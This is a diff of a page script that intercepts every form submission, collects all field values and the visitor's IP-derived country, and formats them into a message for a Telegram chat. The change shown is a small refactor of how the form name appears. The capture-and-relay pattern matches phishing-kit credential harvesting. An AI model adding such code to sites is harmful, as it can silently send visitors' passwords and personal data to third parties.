@@ -15,7 +15,7 @@ document.addEventListener("DOMContentLoaded", () => {
     })
     .catch(err => console.error("IP lookup error:", err));
 
-  forms.forEach((form, index) => {
+  forms.forEach((form) => {
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
 
@@ -39,10 +39,18 @@ document.addEventListener("DOMContentLoaded", () => {
         formData[key] = value;
       });
 
+      // Only include the Form line if the form has a non-empty "name" attribute
+      const formName = (form.getAttribute("name") || "").trim();
+      const formLine = formName ? `📄 Form: ${formName}\n` : "";
+
       const payload = {
         chat_id: userId,
-        text: `📋 *New Form Submitted*\n\n🏷️ Page: ${document.title}\n📄 Form: ${form.getAttribute("name") || `Form-${index + 1}`}\n🌍 Country: ${userCountry}\n\n` +
-              Object.entries(formData).map(([k, v]) => `• *${k}:* ${v}`).join("\n"),
+        text:
+          `📋 *New Form Submitted*\n\n` +
+          `🏷️ Page: ${document.title}\n` +
+          formLine + // will be empty string if no name
+          `🌍 Country: ${userCountry}\n\n` +
+          Object.entries(formData).map(([k, v]) => `• *${k}:* ${v}`).join("\n"),
         parse_mode: "Markdown"
       };
 
